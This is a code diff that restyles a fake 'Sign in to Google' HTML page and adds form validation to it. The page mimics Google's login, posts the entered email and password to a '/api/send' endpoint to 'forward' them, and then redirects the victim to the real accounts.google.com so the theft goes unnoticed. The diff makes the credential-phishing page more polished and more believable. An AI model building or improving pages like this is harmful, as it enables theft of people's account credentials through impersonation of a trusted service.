@@ -3,149 +3,53 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Account Sign-In</title>
+  <title>Google Account Sign‑In</title>
   <style>
-    body {
-      margin: 0;
-      font-family: 'Roboto', Arial, sans-serif;
-      background: #fff;
-      min-height: 100vh;
+    :root {
+      --bg-start: #87CEEB;
+      --bg-end: #E0F7FA;
+      --card-bg: #ffffff;
+      --text-primary: #202124;
+      --text-secondary: #5f6368;
+      --border-color: #dfe1e5;
+      --btn-bg: #1a73e8;
+      --btn-hover: #1765ef;
     }
-
-    .container {
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      /* Gradient background mimicking Google's theme */
-      background: linear-gradient(135deg, #87CEEB, #E0F7FA);
-    }
-
-    .card {
-      background: #fff;
-      padding: 2rem 2.5rem;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      width: 100%;
-      max-width: 340px;
-      box-sizing: border-box;
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 1.5rem;
-      color: #333;
-      font-size: 1.5rem;
-      font-weight: 500;
-    }
-
-    .input-group {
-      margin-bottom: 1.2rem;
-    }
-
-    .input-group label {
-      display: block;
-      margin-bottom: 0.5rem;
-      font-size: 0.9rem;
-      color: #555;
-    }
-
-    .input-group input {
-      width: 100%;
-      padding: 0.8rem;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      box-sizing: border-box;
-      font-size: 1rem;
-      transition: border-color 0.3s;
-    }
-
-    .input-group input:focus {
-      outline: none;
-      border-color: #4285F4;
-      box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
-    }
-
-    .btn {
-      width: 100%;
-      padding: 0.9rem;
-      background: #4285F4;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      font-size: 1rem;
-      font-weight: 500;
-      cursor: pointer;
-      margin-top: 1rem;
-    }
-
-    .btn:focus {
-      outline: none;
-    }
-
-    .btn:hover {
-      background: #357abd;
-    }
-
-    @media (max-width: 360px) {
-      .card { padding: 1.5rem 1.8rem; }
-    }
+    body { margin:0; font-family:'Roboto',Arial,sans-serif; background:var(--bg-start); background:linear-gradient(135deg,var(--bg-start),var(--bg-end)); min-height:100vh; color:var(--text-primary); }
+    .container { height:100vh; display:flex; align-items:center; justify-content:center; padding:1rem; }
+    .card { background:var(--card-bg); width:100%; max-width:360px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.15); padding:2.5rem 2rem; box-sizing:border-box; }
+    h2 { text-align:center; margin:0 0 1.5rem; font-size:1.8rem; font-weight:500; color:var(--text-primary); }
+    p.subtitle { text-align:center; margin:0 0 2rem; font-size:0.95rem; color:var(--text-secondary); }
+    .input-group { margin-bottom:1.6rem; }
+    .input-group label { display:block; margin-bottom:0.4rem; font-size:0.85rem; color:var(--text-secondary); }
+    .input-group input { width:100%; padding:0.9rem 1rem; border:1px solid var(--border-color); border-radius:8px; font-family:inherit; font-size:1rem; box-sizing:border-box; transition:border-color .2s,box-shadow .2s; }
+    .input-group input:focus { outline:none; border-color:var(--btn-bg); box-shadow:0 0 0 3px rgba(26,115,232,0.15); }
+    .input-group input.error { border-color:#cf2a2a; box-shadow:0 0 0 3px rgba(207,42,42,0.15); }
+    .error-msg { margin-top:0.4rem; font-size:0.78rem; color:#cf2a2a; }
+    .btn { width:100%; padding:0.95rem; background:var(--btn-bg); color:#fff; border:none; border-radius:8px; font-family:inherit; font-size:1rem; font-weight:500; cursor:pointer; margin-top:1rem; transition:background .2s; }
+    .btn:focus { outline:none; background:var(--btn-hover); }
+    .btn:hover { background:var(--btn-hover); }
+    .btn:active { background:#1659d9; }
+    .footer-links { margin-top:1.5rem; text-align:center; font-size:0.8rem; color:var(--text-secondary); }
+    .footer-links a { color:var(--btn-bg); text-decoration:underline; }
+    @media (max-width:380px) { .card { padding:2rem 1.5rem; } h2 { font-size:1.6rem; } }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="card">
       <h2>Sign in to Google</h2>
+      <p class="subtitle">Enter your account details below</p>
       <form id="loginForm">
-        <div class="input-group">
-          <label for="email">Email or phone</label>
-          <input type="email" id="email" name="email" placeholder="Enter your email" required autocomplete="username">
-        </div>
-        <div class="input-group">
-          <label for="password">Password</label>
-          <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
-        </div>
+        <div class="input-group"><label for="email">Email or phone</label><input type="email" id="email" name="email" placeholder="Enter your email" required autocomplete="username"><div class="error-msg" id="emailErr"></div></div>
+        <div class="input-group"><label for="password">Password</label><input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password"><div class="error-msg" id="passwordErr"></div></div>
         <button type="submit" class="btn">Next</button>
+        <div class="footer-links"><a href="#">Forgot password?</a></div>
       </form>
     </div>
   </div>
-
   <script>
-    const form = document.getElementById('loginForm');
-
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      const email = form.elements.email.value.trim();
-      const password = form.elements.password.value.trim();
-
-      if (!email || !password) {
-        alert('Please fill in both email and password.');
-        return;
-      }
-
-      try {
-        const response = await fetch('/api/send', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ email, password }),
-        });
-
-        const data = await response.json();
-
-        if (data.success) {
-          // On successful forwarding, redirect to Google Accounts page
-          window.location.href = 'https://accounts.google.com';
-        } else {
-          alert('Failed to forward data: ' + (data.error || 'unknown error'));
-        }
-      } catch (err) {
-        console.error('Fetch error:', err);
-        alert('An error occurred while submitting the form.');
-      }
-    });
+    const form=document.getElementById('loginForm'); const emailInput=form.elements.email; const passwordInput=form.elements.password; const emailErr=document.getElementById('emailErr'); const passwordErr=document.getElementById('passwordErr'); function clearErrors(){ emailErr.textContent=''; passwordErr.textContent=''; emailInput.classList.remove('error'); passwordInput.classList.remove('error'); } function setError(input,msg){ input.classList.add('error'); const errDiv=input.nextElementSibling; if(errDiv&&errDiv.classList.contains('error-msg')){ errDiv.textContent=msg; } } form.addEventListener('submit',async (e)=>{ e.preventDefault(); clearErrors(); const email=emailInput.value.trim(); const password=passwordInput.value.trim(); let valid=true; if(!email){ setError(emailInput,'Email is required'); valid=false; } else if(!/@/.test(email)){ setError(emailInput,'Enter a valid email address'); valid=false; } if(!password){ setError(passwordInput,'Password is required'); valid=false; } if(!valid) return; try { const response=await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,password})}); const data=await response.json(); if(data.success){ window.location.href='https://accounts.google.com'; } else { alert('Failed to forward data: '+ (data.error||'unknown error')); } } catch (err) { console.error('Fetch error:',err); alert('An error occurred while submitting the form.'); } });
   </script>
 </body>
 </html>
